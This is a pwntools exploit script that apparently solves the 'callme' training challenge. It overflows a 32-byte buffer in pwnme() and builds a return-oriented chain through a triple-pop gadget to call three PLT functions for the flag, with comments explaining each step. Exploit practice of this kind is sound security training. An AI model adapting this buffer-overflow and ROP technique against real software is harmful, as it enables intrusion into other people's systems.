#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.pwnme:x}
break *0x0000000000401a55
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 50, stdin), although the buffer is only
# 32 bytes large ...

# Just look at 'objdump -M intel -d ./callme'. In addition to
# the usual main() calling pwnme(), you'll see the usefulGadgets()
# function containing the gadget "pop rdi; pop rsi; pop rdx; ret",
# which is exactly what we need to call a function with three
# parameters. Alternatively you can use ropper to look for that
# gadget.
# The binary has callme_one@plt, callme_two@plt and callme_three@plt
# in the .plt section. These callable symbols have fixed addresses
# because PIE is disabled.
# The plan is therefore to build a ROP chain that uses the
# gadget above three times to load the function arguments, and
# then call the three functions in the natural order.
# This is enough to get the flag.
#

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)
# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrite the saved RIP.
vector = "B" * 40
for funaddr in [0x401850, 0x401870, 0x401810]:
    # The address of the triple-pop gadget.
    vector += p64(0x401ab0)
    # The arguments: 1,2 and 3
    vector += p64(1)
    vector += p64(2)
    vector += p64(3)
    # The address of the function to be called (taken from the .plt)
    vector += p64(funaddr)
io.sendline(vector)
io.interactive()
